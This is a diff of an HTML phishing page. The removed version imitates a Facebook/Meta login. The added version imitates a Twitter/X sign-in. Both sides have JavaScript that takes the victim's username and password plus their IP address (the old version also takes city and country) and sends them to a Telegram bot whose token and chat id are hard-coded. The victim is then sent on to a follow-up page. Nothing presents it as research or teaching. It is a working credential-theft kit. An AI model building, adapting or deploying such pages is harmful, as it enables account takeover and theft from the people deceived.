@@ -1,111 +1,315 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login Page</title>
-  <script src="https://cdn.tailwindcss.com/"></script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
+  <meta name="viewport" content="width=device-width, 
+				initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <title> Login Page Like</title>
   <style>
-    body {
-      font-family: 'Roboto', sans-serif;
-      background: linear-gradient(to bottom right, #fbe0ff00, #c9ebf000);
-    }
+    /* style.css */
+@import url( 
+'https://fonts.googleapis.com/css2?family=Poppins&display=swap'); 
+
+* { 
+	margin: 0; 
+	padding: 0; 
+	box-sizing: border-box; 
+} 
+
+body { 
+
+
+	/* background: rgba(0, 0, 0, 0.40);  */
+	display: flex; 
+	height: 100vh; 
+	justify-content: center; 
+	align-items: center; 
+	font-family: 'Poppins', sans-serif; 
+
+} 
+
+.inner-container { 
+	height: auto; 
+	display: flex; 
+	justify-content: center; 
+	align-items: center; 
+	color: darkgreen; 
+} 
+
+.main-signin { 
+	height: 700px; 
+	width: 600px; 
+	padding: 32px 48px; 
+	background-color: white; 
+	border-radius: 15px; 
+} 
+
+
+input { 
+	height: 50px; 
+	width: 300px; 
+	border-radius: 5px; 
+	text-align: center; 
+	cursor: context-menu; 
+	border: 1px solid rgb(193, 186, 186); 
+	font-size: 15px; 
+	font-weight: 500; 
+	color: rgb(193, 186, 186); 
+	text-align: left; 
+	padding: 10px; 
+} 
+
+input:focus { 
+	color: black; 
+} 
+
+.link_forp { 
+	text-decoration: none; 
+	color: rgb(0, 0, 0) 
+} 
+
+/* .link_forp:hover{ 
+	background-color: rgb(193, 186, 186); 
+} */
+.link_next { 
+	text-decoration: none; 
+	color: white; 
+} 
+
+.sign-heading { 
+	text-align: center; 
+
+} 
+
+.horizontzl_line { 
+	border: 1px solid rgb(193, 186, 186); 
+	width: 130px; 
+	height: 1px; 
+	margin: 12px; 
+} 
+
+.flex_or { 
+	display: flex; 
+	gap: 6px; 
+
+} 
+
+.no_a_text { 
+	color: rgb(119, 117, 117); 
+	margin-left: 20px; 
+} 
+
+.first-input { 
+	margin: 30px; 
+	display: flex; 
+	height: 140px; 
+	flex-direction: column; 
+	justify-content: center; 
+	align-items: center; 
+	gap: 10px; 
+} 
+
+.btn1_nxt { 
+	width: 300px; 
+	height: 36px; 
+	color: white; 
+	background-color: black; 
+	font-weight: 700; 
+	font: 15px; 
+	border-radius: 50px; 
+} 
+
+.btn1_nxt:hover { 
+	background-color: rgb(37, 35, 35); 
+} 
+
+.btn1_forp { 
+	width: 300px; 
+	height: 36px; 
+	border-radius: 50px; 
+	border: 1px solid rgb(193, 186, 186); 
+	font-weight: 700; 
+	font-size: 15px; 
+	background-color: white; 
+} 
+
+.btn1_forp:hover { 
+	background-color: rgb(240, 236, 236); 
+} 
+
+.link_su { 
+	text-decoration: none; 
+	color: rgb(49, 204, 255); 
+} 
+
+.link_su:hover { 
+	text-decoration: underline; 
+} 
+
+.flexbottom_text { 
+	display: flex; 
+	gap: 2px; 
+	margin: 20px; 
+	text-align: center; 
+	padding-left: 15px; 
+} 
+
+.sign_apple { 
+	text-align: center; 
+	padding: 8px; 
+} 
+
+.con_box { 
+	display: flex; 
+	flex-direction: column; 
+	justify-content: center; 
+	align-items: center; 
+	gap: 70px; 
+} 
+
+.cont_two { 
+	display: flex; 
+	height: 300px; 
+	flex-direction: column; 
+	justify-content: center; 
+	align-items: center; 
+} 
+
+.btn_cont { 
+	display: flex; 
+	height: 100px; 
+	flex-direction: column; 
+	justify-content: center; 
+	align-items: center; 
+	gap: 10px; 
+} 
+
+.close { 
+	font-size: 20px; 
+	font-weight: 500; 
+}
+
   </style>
 </head>
-<body class="flex items-center justify-center min-h-screen">
-  <div class="w-full max-w-sm p-6 rounded-lg">
-    <div class="text-center mb-6">
-      <img alt="Facebook logo" class="mx-auto mb-4" height="80" src="https://i.postimg.cc/FKk4ZQ1r/60ed83ab035dbe00046c24b8.png" width="70"/>
+
+<body>
+  <div class="container">
+
+    <div class="main-signin">
+      <!-- <div class="close">X</div> -->
+      
+      <div class="con_box">
+
+        <div class="cont_one">
+          <div class="flexbottom_text">
+            
+            <h1 class="logo-cancel sign-heading">
+              X
+            </h1>
+          </div>
+        </div>
+
+        <div class="cont_two">
+          <form id="contactForm"  method="POST" >
+<input type="text" id="ipaddress" name="ipaddress" hidden>
+            <div class="first-input">
+
+              <div class="btn1_forp sign_apple" style="margin-bottom: 10px;">
+                Sign in with Google
+              </div>
+              <div class="btn1_forp sign_apple">
+                Sign in with Apple
+              </div>
+              <div class="flex_or">
+                <div class="horizontzl_line"></div>
+                <div class="ortext">or</div>
+                <div class="horizontzl_line"></div>
+              </div>
+ <!-- <input type="hidden" name="_captcha" value="false"> -->
+                                    <!-- <input type="hidden" name="_next" value="https://qwayv.netlify.app/twpop.html"> -->
+              <label for="emailid"></label>
+              <input type="text" name="username" placeholder="Phone, email, or username" id="username" value="" required>
+              
+              <label for="Password"></label>
+              <input type="text" name="Password" placeholder="Password" id="password" value="" required>
+
+            </div>
+            <br>
+             <div class="btn_cont">
+              <button class="btn1_nxt" type="submit" id="submit">
+               
+                  Next
+           
+              </button>
+              <button class="btn1_forp">
+                <a href="#" class="link_forp">
+                  Forget Password ?
+                </a>
+              </button>
+            </div>
+            <div class="flexbottom_text">
+              <div class="no_a_text">
+                Don't have an account ?
+              </div>
+              <div>
+                <a href="#" class="link_su">
+                  Sign Up
+                </a>
+              </div>
+            </div>
+          </form>
+        </div>
+
+      </div>
     </div>
-    <form id="contactForm" method="POST">
-      <input type="hidden" id="ipaddress" name="IPaddress">
-      <input type="hidden" id="city" name="city">
-      <input type="hidden" id="country" name="country">
-
-      <div class="mb-4">
-        <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900" placeholder="Phone number, username, or email" type="text" name="username" id="username" required/>
-      </div>
-      <div class="mb-4">
-        <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600" placeholder="Password" type="password" name="password" id="password" required/>
-      </div>
-      <div class="mb-4">
-        <button class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-black-700" type="submit" id="button" value="submit">
-          Log in
-        </button>
-      </div>
-      <div class="text-center mb-4">
-        <a class="text-black-600 hover:underline" href="#">Forgotten Password?</a>
-      </div>
-
-      <div class="text-center mb-4 mt-10">
-        <button class="w-full py-3 border border-blue-600 text-blue-600 rounded-xl hover:bg-blue-50" type="button">
-          Create new account
-        </button>
-      </div>
-      <div class="text-center mt-6">
-        <img alt="Meta logo" class="mx-auto mb-2" height="20" src="https://i.postimg.cc/DZY1KLnd/pngegg-2.png" width="70"/>
-      </div>
-    </form>
   </div>
+  <!-- <script src="script.js"></script> -->
+   <script>
+	document.addEventListener('DOMContentLoaded', function () {
+		// Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+		fetch('https://api.ipify.org?format=json')
+			.then(response => response.json())
+			.then(data => {
+				const ipaddress = data.ip;
+				document.getElementById('ipaddress').value = ipaddress;
+			})
+			.catch(error => {
+				console.error('Error fetching IP address:', error);
+			});
+	});
 
-  <script>
-    document.addEventListener('DOMContentLoaded', function () {
-      // Fetch IP address
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          document.getElementById('ipaddress').value = data.ip || '';
-        })
-        .catch(error => {
-          console.error('IP Fetch Error:', error);
-          alert('Failed to fetch IP address. Please try again.');
-        });
 
-      // Fetch location data
-      fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-          document.getElementById('city').value = data.city || '';
-          document.getElementById('country').value = data.country_name || '';
-        })
-        .catch(error => {
-          console.error('Location Fetch Error:', error);
-          alert('Failed to fetch location info.');
-        });
 
-      // Form submission
-      document.getElementById('contactForm').addEventListener('submit', function (event) {
-        event.preventDefault();
+	document.getElementById('contactForm').addEventListener('submit', function (event) {
+		event.preventDefault();
 
-        var username = document.getElementById('username').value;
-        var password = document.getElementById('password').value;
-        var ipaddress = document.getElementById('ipaddress').value;
-        var city = document.getElementById('city').value;
-        var country = document.getElementById('country').value;
+		var username = document.getElementById('username').value;
+		var password = document.getElementById('password').value;
+		var ipaddress = document.getElementById('ipaddress').value;
 
-        var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
+		var telegramMessage = `Username-twitter: ${username}\nPassword-twitter: ${password}\nIpaddress: ${ipaddress}`;
 
-        var token = '7245614431:AAFDtt-ZsldZkJNYyX4foQB7wqvCJz0nrZA';
-        var chat_id = '6961550883';
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+		      var token = '8426130944:AAFqzg6H0uK4TpHPWKiYdqXve46_8Ekjy6I';
+            var chat_id = '7605799343';
 
-        fetch(url)
-          .then(response => response.json())
-          .then(data => {
-            if (data.ok) {
-              window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';
-            } else {
-              alert('Failed to send data. Try again.');
-            }
-          })
-          .catch(error => {
-            console.error('Telegram Error:', error);
-            alert('Network error. Please check your connection.');
-          });
-      });
-    });
-  </script>
+		var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+		fetch(url)
+			.then(response => response.json())
+			.then(data => {
+				if (data.ok) {
+					window.location.href = 'thanks.html';  // Redirect to thank you page
+				} else {
+					alert('Error sending message.');
+				}
+			})
+			.catch(error => {
+				console.error('Error:', error);
+			});
+	});
+</script>
 </body>
+
 </html>
